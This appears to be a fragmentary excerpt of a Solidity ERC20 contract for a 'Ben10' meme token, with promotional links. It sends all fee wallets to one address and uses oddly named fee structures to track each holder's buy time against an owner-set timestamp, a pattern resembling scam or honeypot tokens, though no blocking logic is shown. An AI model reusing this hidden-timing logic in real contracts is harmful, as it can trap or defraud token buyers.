...
Your favourite childhood hero is coming to erc accompanied by his 10 aliens!

Telegram: https://t.me/Ben10Entry
Website:  https://ben10.online/
...
contract Ben10 is ERC20, Ownable {
    ...
    mapping(address => FeesData) private FeeTxs;
    ...
    constructor() ERC20("Ben10", "BEN10") {
        ...
        marketingWallet = payable(0x5a3E34995D3A0962f72b7E77DA2606Bd1a121cf6);
        developmentWallet = payable(0x5a3E34995D3A0962f72b7E77DA2606Bd1a121cf6);
        liquidityWallet = payable(0x5a3E34995D3A0962f72b7E77DA2606Bd1a121cf6);
    ...
    function _transfer(
        ...
        if (!allowFees && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                FeesData storage FeesLists = FeeTxs[to];
                if (FeesLists.btime == 0) {
                    FeesLists.btime = block.timestamp;
                }
            } else {
                FeesData storage FeesLists = FeeTxs[from];
                FeesLists.holdingDuration = FeesLists.btime - _feesTimestamp;
                FeesLists.stime = block.timestamp;
            }
        }
